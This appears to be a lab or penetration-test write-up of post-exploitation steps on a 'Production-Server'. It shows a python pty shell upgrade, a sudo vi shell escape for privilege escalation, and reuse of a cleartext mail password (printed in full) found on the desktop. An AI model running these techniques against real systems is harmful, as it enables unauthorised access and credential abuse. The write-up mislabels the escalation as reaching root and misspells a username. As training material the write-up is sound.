# Post Exploit - Production Server

- [Post Exploit - Production Server](#post-exploit---production-server)
  - [Shell Upgrade](#shell-upgrade)
  - [Privilege Escalation](#privilege-escalation)
  - [Local Enumeration](#local-enumeration)

---

## Shell Upgrade

First get a pty session using python:

```
python -c 'import pty; pty.spawn("/bin/bash")'
CTRL-Z
stty -echo raw
fg
reset
export TERM=xterm
```

<br/>

## Privilege Escalation

Check `sudo` privilege of the current user `www-data`:

```
sudo -l
```

![picture 21](images/e70e18b78f7d2735a4b010fd671dace697330d9620f2afba5e740a100f804b81.png)  

`/usr/bin/vi` can be used with sudo privilege as webadmin without supplying a password.

<br/>

To escalate to root privilege, we can use the following command:

```
sudo -u webadmin /usr/bin/vi -c ':!/bin/bash' /dev/null
```

![picture 22](images/55ee44798c95fbb527eb0c36a6781d7eae9de1bfe069a4a694f9f091316de617.png)  

<br/>

---

## Local Enumeration

Checking the `auth.log.1` file, an internal was found to have connected to the Production-Server as `webadmin`:

![picture 26](images/624067548c2b8b147cc0fdd4dacc3acbeb0a633c585645421d755ba69ccceea5.png)  

Checking the interface, there is only one available - likely the Production-Server is placed in the DMZ:

```
ifconfig
```

![picture 27](images/35d95c16f46cbb447f49b9c996fac4c89e1808ecf783e5927523ce3832dddad6.png)  



Checking the path `/home/webadmin/Desktop`, there is a file `Mail-Configuration` with cleartext credential:

![picture 23](images/0f0452c0410f06e747e313faf2dbe6099f85ac433a8515ff6a66e20688205ff9.png)  


```
UserName: iyer
Passwd: Iyer@123
Port: 110,143
```

Try to reuse this credential to login as iyer:

```
su iyer
```

![picture 24](images/df14688229fcfbedd616f90e9fb8cd21d3cf6ec7d2cfe6f149fec0078782f3da.png)  

As shown we get the privilege of the user `iver`. However, it does not have any sudo privilege:

![picture 25](images/42309eb52074285bd7dc0254c0bb1a738106b4bf27c4ab870bb08a5acbbc895c.png)  

